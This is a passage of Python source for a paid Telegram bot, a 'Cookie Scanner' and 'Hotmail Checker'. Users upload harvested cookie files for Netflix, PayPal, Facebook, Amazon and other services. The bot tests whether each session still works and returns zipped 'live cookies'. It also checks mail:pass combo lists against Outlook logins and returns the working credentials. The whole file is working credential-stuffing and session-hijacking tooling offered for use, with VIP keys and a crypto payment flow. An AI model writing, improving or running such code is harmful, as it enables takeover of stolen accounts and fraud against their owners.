            "└─────────────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return

    if data == 'admin_panel':
        if str(user_id) != ADMIN_USER_ID:
            await query.edit_message_text("You don't have permission to use this feature.")
            return
        keyboard = [
            [InlineKeyboardButton("Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("Set VIP", callback_data="admin_set_vip")],
            [InlineKeyboardButton("Delete VIP", callback_data="admin_del_vip")],
            [InlineKeyboardButton("Get Key", callback_data="admin_get_key")],
            [InlineKeyboardButton("Remove Key", callback_data="admin_remove_key")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Admin Panel\n\nChoose an option:", reply_markup=reply_markup)
        return

    if data == 'admin_stats':
        fake_update = Update(update.update_id, callback_query=query)
        await admin_stats(fake_update, context)
        return

    if data == 'admin_set_vip':
        await query.edit_message_text("Use command: /setvip <user_id> <days>")
        return

    if data == 'admin_del_vip':
        await query.edit_message_text("Use command: /delvip <user_id>")
        return

    if data == 'admin_get_key':
        await query.edit_message_text("Use command: /getkey <duration> <max_users>\nExample: /getkey 1hours 1 or /getkey 1day 5")
        return

    if data == 'admin_remove_key':
        await query.edit_message_text("Use command: /removekey <key>\nExample: /removekey ABCD1-EFGH2-IJKL3-MNOP4")
        return

    if data == 'check_plan':
        fake_update = Update(update.update_id, callback_query=query)
        await check_plan(fake_update, context)
        return
    
    if data == 'copy_ltc':
        wallet_address = PAYMENT_ACCOUNTS['ltc']
        await query.message.reply_text(f"LTC Address: {wallet_address}")
        return

    if data == 'main_menu':
        context.user_data.pop('mode', None)
        keyboard = [
            [InlineKeyboardButton("Services List", callback_data="services_list"),
             InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
            [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
            [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
             InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
        ]
        if str(user_id) == ADMIN_USER_ID:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Cookie Scanner Bot Menu\n\nChoose an option:", reply_markup=reply_markup)
        return

    if data == 'services_list':
        keyboard = [
            [InlineKeyboardButton("Netflix", callback_data="service_netflix"),
             InlineKeyboardButton("Spotify", callback_data="service_spotify")],
            [InlineKeyboardButton("TikTok", callback_data="service_tiktok"),
             InlineKeyboardButton("Facebook", callback_data="service_facebook")],
            [InlineKeyboardButton("Canva", callback_data="service_canva"),
             InlineKeyboardButton("Roblox", callback_data="service_roblox")],
            [InlineKeyboardButton("Instagram", callback_data="service_instagram"),
             InlineKeyboardButton("YouTube", callback_data="service_youtube")],
            [InlineKeyboardButton("LinkedIn", callback_data="service_linkedin"),
             InlineKeyboardButton("Amazon", callback_data="service_amazon")],
            [InlineKeyboardButton("WordPress", callback_data="service_wordpress"),
             InlineKeyboardButton("CapCut", callback_data="service_capcut")],
            [InlineKeyboardButton("PayPal", callback_data="service_paypal")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Select service:", reply_markup=reply_markup)
        return

    if data == 'scan_all':
        context.user_data['selected_service'] = 'all'
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "┌─── ⋆⋅☆⋅⋆ ── SERVICE SELECTION ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ SCANNING CONFIG █▓▒░\n\n"
            "   ⫸ Selected: Scan All Services\n"
            "   ⫸ Requirement: .txt or .zip\n"
            "   ⫸ Type: Cookie File\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  ACTION REQUIRED:\n"
            "   Now send .txt or .zip cookie file \n"
            "   to start the scanning process.\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ STATUS: WAITING FOR FILE... 📁\n\n"
            "└──────────────────────────────────────────┘",
            reply_markup=reply_markup
        )
        return

    if data.startswith('service_'):
        service_key = data.split('service_')[1]
        context.user_data['selected_service'] = service_key
        keyboard = [[InlineKeyboardButton("Back", callback_data="services_list")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "┌─── ⋆⋅☆⋅⋆ ── SERVICE SELECTION ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ SCANNING CONFIG █▓▒░\n\n"
            f"   ⫸ Selected: {SERVICES.get(service_key, 'Unknown')}\n"
            "   ⫸ Requirement: .txt or .zip\n"
            "   ⫸ Type: Cookie File\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  ACTION REQUIRED:\n"
            "   Now send .txt or .zip cookie file \n"
            "   to start the scanning process.\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ STATUS: WAITING FOR FILE... 📁\n\n"
            "└──────────────────────────────────────────┘",
            reply_markup=reply_markup
        )


def scan_cookie_content(content, service_name, original_content=None):
    try:
        cookies = parse_cookies_txt(content)
        if not cookies:
            return {'error': 'No valid cookies found in file'}
        if service_name == 'all':
            results = {}
            for service_key, service_info in SCAN_TARGETS.items():
                service_domains = service_info['domains']
                filtered_cookies = filter_cookies_by_domain(cookies, service_domains)
                if filtered_cookies:
                    test_function = SERVICE_TEST_FUNCTIONS.get(service_key)
                    if test_function:
                        result = test_function(filtered_cookies)
                        if not isinstance(result, dict):
                            result = {'status': 'unknown','message': 'Internal error while testing cookies'}
                        result['cookie_count'] = len(filtered_cookies)
                        result['service_name'] = service_key
                        if original_content and result.get('status') == 'success':
                            result['original_content'] = original_content
                        results[service_key] = result
            return {'all_results': results}
        else:
            if service_name not in SCAN_TARGETS:
                return {'error': f'Scan not supported for {service_name}'}
            service_domains = SCAN_TARGETS[service_name]['domains']
            filtered_cookies = filter_cookies_by_domain(cookies, service_domains)
            if not filtered_cookies:
                return {'error': f'No suitable cookies found for {service_name}'}
            test_function = SERVICE_TEST_FUNCTIONS.get(service_name)
            if not test_function:
                return {'error': f'Scan not supported for {service_name}'}
            result = test_function(filtered_cookies)
            if not isinstance(result, dict):
                result = {'status': 'unknown','message': 'Internal error while testing cookies'}
            result['cookie_count'] = len(filtered_cookies)
            if original_content and result.get('status') == 'success':
                result['original_content'] = original_content
            return result
    except Exception as e:
        return {'error': f'Error scanning cookie: {str(e)}'}

def parse_hotmail_line(line):
    line = line.strip()
    if not line or '@' not in line or ':' not in line:
        return None
    email, password = line.split(':', 1)
    email = email.strip()
    password = password.strip()
    if not email or '@' not in email or not password:
        return None
    return email, password

OUTLOOK_CHECKER = None

def get_outlook_checker():
    global OUTLOOK_CHECKER
    if OUTLOOK_CHECKER is not None:
        return OUTLOOK_CHECKER
    try:
        checker = OutlookChecker(keyword_file=None, debug=False)
    except TypeError:
        try:
            checker = OutlookChecker(None, False)
        except TypeError:
            checker = OutlookChecker()
    OUTLOOK_CHECKER = checker
    return OUTLOOK_CHECKER

def check_hotmail_api(email, password):
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return 'die'
    max_retry = 3
    result = "❌ ERROR"
    for attempt in range(max_retry):
        try:
            try:
                checker = OutlookChecker(keyword_file=None, debug=False)
            except TypeError:
                try:
                    checker = OutlookChecker(None, False)
                except TypeError:
                    checker = OutlookChecker()
            result = checker.check(email, password)
            if any(x in result for x in ["✅ HIT", "🆓 FREE", "❌ BAD", "Locked", "Need Verify", "Timeout"]):
                break
            elif "Request Error" in result or "ERROR" in result:
                if attempt + 1 >= max_retry:
                    break
                time.sleep(1)
            else:
                break
        except Exception as e:
            result = f"❌ ERROR: {str(e)}"
            if attempt + 1 >= max_retry:
                break
            time.sleep(1)
    if any(x in result for x in ["✅ HIT", "🆓 FREE"]):
        return 'live'
    return 'die'

def process_single_file(file_name, content, selected_service):
    try:
        result = scan_cookie_content(content, selected_service, original_content=content)
        return file_name, result
    except Exception as e:
        return file_name, {'error': f'Error processing file: {str(e)}'}

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    user_id = user.id
    chat = update.effective_chat
    chat_id = chat.id if chat else None
    if chat_id is not None and is_restricted_private(user_id, chat_id):
        keyboard = [[InlineKeyboardButton("Join Channel Chat", url=CHANNEL_INVITE_LINK)],
                    [InlineKeyboardButton("Main Menu", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(PRIVATE_BLOCK_MESSAGE, reply_markup=reply_markup)
        return

    mode = context.user_data.get('mode')
    if mode == 'hotmail_checker':
        can_scan, error_msg = can_user_scan(user_id)
        if not can_scan:
            keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(error_msg, reply_markup=reply_markup)
            return
        doc = update.message.document
        if not doc:
            await update.message.reply_text("No document attached.")
            return
        file = await doc.get_file()
        file_name = clean_filename(doc.file_name or "hotmail.txt")
        ext = Path(file_name).suffix.lower()
        if ext != '.txt':
            await update.message.reply_text("Please send a .txt file containing hotmail in format mail:pass.")
            return
        file_bytes = await file.download_as_bytearray()
        try:
            content = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            content = file_bytes.decode('latin-1', errors='ignore')

        raw_lines = [line.strip() for line in content.splitlines() if line.strip()]
        accounts = []
        for line in raw_lines:
            parsed = parse_hotmail_line(line)
            if parsed:
                email, password = parsed
                accounts.append((email, password, line))

        if not accounts:
            await update.message.reply_text("File does not contain any hotmail in mail:pass format.")
            return

        total = len(accounts)
        live_list = []
        die_count = 0
        bar_length = 20
        status_msg = await update.message.reply_text(
            "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
            f"   ⫸ Total   : {total}\n"
            "   ⫸ Checked : 0\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   🟢 LIVE   : 0\n"
            "   🔴 DIE    : 0\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            f"   PROGRESS: [{'░' * bar_length}] 0%\n\n"
            "   Status: ⏳ Checking...\n\n"
            "└────────────────────────────────────────┘"
        )


        for idx, (email, password, original_line) in enumerate(accounts, start=1):
            result = await asyncio.to_thread(check_hotmail_api, email, password)
            if result == 'live':
                live_list.append(original_line)
            else:
                die_count += 1
            checked = idx
            filled = int(bar_length * checked / total)
            bar = "[" + "█" * filled + "░" * (bar_length - filled) + "]"
            percent = int(checked * 100 / total)
            status_line = "✅ Task Completed!" if checked == total else "⏳ Checking..."
            text = (
                    "┌─── ⋆⋅☆⋅⋆ ── CHECKING STATUS ── ⋆⋅☆⋅⋆ ──┐\n\n"
                    "   ░▒▓█ PROCESSING LIST... █▓▒░\n\n"
                    f"   ⫸ Total   : {total}\n"
                    f"   ⫸ Checked : {checked}\n"
                    "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                    f"   🟢 LIVE   : {len(live_list)}\n"
                    f"   🔴 DIE    : {die_count}\n"
                    "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                    f"   PROGRESS: {bar} {percent}%\n\n"
                    f"   Status: {status_line}\n\n"
                    "└────────────────────────────────────────┘"
            )
            try:
                await status_msg.edit_text(text)
            except Exception:
                pass


        if live_list:
            output = "\n".join(live_list)
            buffer = BytesIO(output.encode('utf-8'))
            buffer.name = "hotmail_valid.txt"
            await update.message.reply_document(
                document=buffer,
                filename="hotmail_valid.txt",
                caption=f"Valid: {len(live_list)}/{total}"
            )
        else:
            await update.message.reply_text("No valid hotmail accounts found.")
        increment_file_count(user_id)
        increment_daily_scans(1)
        context.user_data.pop('mode', None)
        return

    if 'selected_service' not in context.user_data:
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Please choose a service first from the menu.", reply_markup=reply_markup)
        return
    can_scan, error_msg = can_user_scan(user_id)
    if not can_scan:
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(error_msg, reply_markup=reply_markup)
        return

    selected_service = context.user_data['selected_service']
    doc = update.message.document
    if not doc:
        await update.message.reply_text("No document attached.")
        return

    status_msg = await update.message.reply_text("The bot is scanning your file, please wait.")

    file = await doc.get_file()
    file_name = clean_filename(doc.file_name or "cookie.txt")
    ext = Path(file_name).suffix.lower()
    file_bytes = await file.download_as_bytearray()

    processed_files = 0
    all_results = {}
    live_cookies = {}

    def scan_zip_sync(file_bytes_inner, selected_service_inner):
        processed_files_inner = 0
        all_results_inner = {}
        live_cookies_inner = {}
        try:
            with zipfile.ZipFile(BytesIO(file_bytes_inner)) as zf:
                names = [n for n in zf.namelist() if n.lower().endswith('.txt')]
                if not names:
                    return 0, "No .txt cookie files found in the .zip", {}
                files_to_process = []
                for n in names:
                    try:
                        with zf.open(n) as f:
                            raw = f.read()
                        try:
                            content = raw.decode('utf-8')
                        except UnicodeDecodeError:
                            content = raw.decode('latin-1', errors='ignore')
                        files_to_process.append((Path(n).name, content))
                    except Exception as e:
                        logger.error(f"Error reading file {n} from zip: {e}")
                if not files_to_process:
                    return 0, "No readable .txt cookie files found in the .zip", {}
                with ThreadPoolExecutor(max_workers=5) as executor:
                    future_to_file = {
                        executor.submit(process_single_file, name, content, selected_service_inner): name
                        for name, content in files_to_process
                    }
                    for future in as_completed(future_to_file):
                        file_name_inner = future_to_file[future]
                        try:
                            fname, result = future.result()
                            all_results_inner[fname] = result
                            if 'error' not in result:
                                if selected_service_inner == 'all':
                                    all_res = result.get('all_results', {})
                                    for sv_name, sv_result in all_res.items():
                                        if sv_result.get('status') == 'success':
                                            if sv_name not in live_cookies_inner:
                                                live_cookies_inner[sv_name] = []
                                            live_cookies_inner[sv_name].append((fname, sv_result))
                                else:
                                    if result.get('status') == 'success':
                                        sv_name = selected_service_inner
                                        if sv_name not in live_cookies_inner:
                                            live_cookies_inner[sv_name] = []
                                        live_cookies_inner[sv_name].append((fname, result))
                            processed_files_inner += 1
                        except Exception as e:
                            logger.error(f"Error processing file in zip: {e}")
            return processed_files_inner, None, live_cookies_inner
        except zipfile.BadZipFile:
            return 0, "Invalid .zip file.", {}
        except Exception as e:
            return 0, f"Error scanning zip: {str(e)}", {}

    try:
        if ext == '.zip':
            processed_files, error_message, live_cookies = await asyncio.to_thread(scan_zip_sync, file_bytes, selected_service)
            if error_message:
                await status_msg.edit_text(error_message)
            else:
                summary = []
                if selected_service == 'all':
                    for svc, cookies_list in live_cookies.items():
                        svc_name = SERVICES.get(svc, svc).title()
                        summary.append(f"{svc_name}: {len(cookies_list)} live cookies")
                else:
                    svc_name = SERVICES.get(selected_service, selected_service).title()
                    summary.append(f"{svc_name}: {sum(len(v) for v in live_cookies.values())} live cookies")
                if summary:
                    await status_msg.edit_text("Scan completed:\n" + "\n".join(summary))
                else:
                    await status_msg.edit_text("Scan completed: No live cookies found.")
                if live_cookies:
                    await send_live_cookies_archive(update, live_cookies, selected_service)
        elif ext == '.txt':
            try:
                content = file_bytes.decode('utf-8')
            except UnicodeDecodeError:
                content = file_bytes.decode('latin-1', errors='ignore')

            file_name, result = await asyncio.to_thread(process_single_file, file_name, content, selected_service)
            processed_files += 1

            if 'error' in result:
                await status_msg.edit_text(f"Error: {result['error']}")
            else:
                if selected_service == 'all':
                    summary_lines = [f"Scan Results for {file_name}:"]
                    for svc, r in result.get('all_results', {}).items():
                        icon = get_status_icon(r.get('status'))
                        plan = extract_public_plan_info(r.get('plan_info', '')) or ""
                        plan = f" • {plan}" if plan else ""
                        summary_lines.append(f"{icon} {SERVICES.get(svc, svc).title()}: {get_status_text(r.get('status'))}{plan}")

                    if not result.get('all_results'):
                        summary_lines.append("No target cookies found.")

                    await status_msg.edit_text("\n".join(summary_lines))

                    live_cookies = {}
                    for svc, r in result.get('all_results', {}).items():
                        if r.get('status') == 'success':
                            live_cookies[svc] = [(file_name, r)]

                    if live_cookies:
                        await send_live_cookies_archive(update, live_cookies, selected_service)

                else:
                    status = result.get('status')
                    icon = get_status_icon(status)
                    plan = extract_public_plan_info(result.get('plan_info', '')) or ""
                    plan = f"\n{plan}" if plan else ""

                    message = f"{file_name}\n{icon} {get_status_text(status)}{plan}"
                    await status_msg.edit_text(message)

                    if status == 'success':
                        live_cookies = {selected_service: [(file_name, result)]}
                        await send_live_cookies_archive(update, live_cookies, selected_service)
        else:
            await status_msg.edit_text("Please send a .txt or .zip file.")
            return

        if processed_files > 0:
            increment_file_count(user_id)
            increment_daily_scans(processed_files)

    except RetryAfter as e:
        wait_for = int(getattr(e, "retry_after", 5))
        await asyncio.sleep(wait_for)
        try:
            await status_msg.edit_text("Telegram is rate limiting. Please resend the file after a few seconds.")
        except Exception:
            pass
    except TimedOut:
        try:
            await status_msg.edit_text("Connection to Telegram timed out. Please try scanning the file again.")
        except Exception:
            pass

async def send_live_cookies_archive(update: Update, live_cookies, selected_service):
    try:
        if not live_cookies:
            return

        with BytesIO() as archive_buffer:
            with zipfile.ZipFile(archive_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                if selected_service == 'all':
                    for service_key, cookies_list in live_cookies.items():
                        service_name = SERVICES.get(service_key, service_key).title()
                        service_folder = f"{service_name}_Live_Cookies/"

                        for file_name, result in cookies_list:
                            content = result.get('original_content', '')
                            if content:
                                zipf.writestr(service_folder + file_name, content)
                else:
                    service_name = SERVICES.get(selected_service, selected_service).title()
                    service_folder = f"{service_name}_Live_Cookies/"

                    for file_name, result in live_cookies.get(selected_service, []):
                        content = result.get('original_content', '')
                        if content:
                            zipf.writestr(service_folder + file_name, content)

            archive_buffer.seek(0)
            archive_name = f"live_cookies_{int(time.time())}_{uuid.uuid4().hex[:6]}.zip"

            await update.message.reply_document(
                document=archive_buffer,
                filename=archive_name,
                caption=f"Live cookies archive ({len(live_cookies)} services)"
            )
    except Exception as e:
        logger.error(f"Error creating archive: {e}")
        await update.message.reply_text(f"Error creating archive: {str(e)}")

async def show_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_start_login(update=update)

def main():
    _fast_print(f"Starting bot with curl_cffi: {HAS_CURL_CFFI}")
    _fast_print("Make sure to install required packages:")
    _fast_print("pip install curl-cffi python-telegram-bot requests")

    application = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("checkplan", check_plan))
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("setvip", admin_set_vip))
    application.add_handler(CommandHandler("delvip", admin_del_vip))
    application.add_handler(CommandHandler("getkey", admin_get_key))
    application.add_handler(CommandHandler("removekey", admin_remove_key))
    application.add_handler(CommandHandler("activatekey", activate_key_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.run_polling()

if __name__ == "__main__":
    main()
